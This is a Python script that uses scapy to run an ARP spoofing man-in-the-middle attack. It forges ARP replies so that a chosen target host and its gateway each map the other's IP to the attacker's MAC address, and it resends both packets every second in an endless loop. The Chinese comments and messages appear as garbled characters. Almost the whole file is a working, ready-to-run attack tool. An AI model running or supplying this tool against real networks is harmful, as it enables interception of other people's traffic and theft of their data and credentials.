# -*- coding: gbk -*-
import argparse
from scapy.all import *
import threading
import time

#�����linuxϵͳ������ʱ����unicode������ش���
#import sys
#reload(sys)
#sys.setdefaultencoding('utf-8')


def getMac(tgtIP):
    '''
    ����scapy��getmacbyip��������ȡ����Ŀ��IP��MAC��ַ��
    '''
    try:
        tgtMac = getmacbyip(tgtIP)
        return tgtMac
    except:
        print('[-]����Ŀ��IP�Ƿ���') 

def createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP):
    '''
    ����ARP���ݰ���α��������ƭĿ������
    srcMac:������MAC��ַ���䵱�м���
    tgtMac:Ŀ��������MAC
    gatewayIP:���ص�IP�����������ص�����ָ�򱾻����м��ˣ����γ�ARP����
    tgtIP:Ŀ��������IP
    op=2,��ʾARP��Ӧ
    '''
    pkt = Ether(src=srcMac,dst=tgtMac)/ARP(hwsrc=srcMac,psrc=gatewayIP,hwdst=tgtMac,pdst=tgtIP,op=2)
    return pkt

def createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP):
    '''
    ����ARP���ݰ���α��Ŀ��������ƭ����
    srcMac:������MAC��ַ���䵱�м���
    gatewayMac:���ص�MAC
    tgtIP:Ŀ��������IP�������ط���Ŀ������������ָ�򱾻����м��ˣ����γ�ARP����
    gatewayIP:���ص�IP
    op=2,��ʾARP��Ӧ
    '''
    pkt = Ether(src=srcMac,dst=gatewayMac)/ARP(hwsrc=srcMac,psrc=tgtIP,hwdst=gatewayMac,pdst=gatewayIP,op=2)
    return pkt


def main():
    usage = 'Usage: %prog -t <targetip> -g <gatewayip> -i <interface> -a'
    parser = argparse.ArgumentParser(description=usage,)
    parser.add_argument('-t',dest='targetIP',type=str,help='ָ��Ŀ������IP')
    parser.add_argument('-g',dest='gatewayIP',type=str,help='ָ������IP')
    parser.add_argument('-i',dest='interface',type=str,help='ָ��ʹ�õ�����')
    parser.add_argument('-a',dest='all',type=bool,help='ȫ������',default=False)
    
    options = parser.parse_args()
    tgtIP = options.targetIP
    gatewayIP = options.gatewayIP
    interface = options.interface
    all=options.all
    
    srcMac = get_if_hwaddr(interface)
    print('����MAC��ַ�ǣ�',srcMac)
    tgtMac = getMac(tgtIP)
    #if(all):
        #tgtMac=None
    print('Ŀ������MAC��ַ�ǣ�',tgtMac)
    gatewayMac = getMac(gatewayIP)
    print('����MAC��ַ�ǣ�',gatewayMac)
    #input('�������������')


    pktstation = createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP)
    pktgateway = createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP)

   
    i = 1
    while True:
        t = threading.Thread(target=sendp,args=(pktstation,),kwargs={'iface':interface})
        t.start()
        t.join()
        print(str(i) + ' [*]����һ�������ARP��ƭ��')
       
        s = threading.Thread(target=sendp,args=(pktgateway,),kwargs={'iface':interface,})
        s.start()
        s.join()
        print(str(i) + ' [*]����һ������ARP��ƭ��')
        i += 1       
        time.sleep(1)
        #if i==5:
            #return
        
            

main()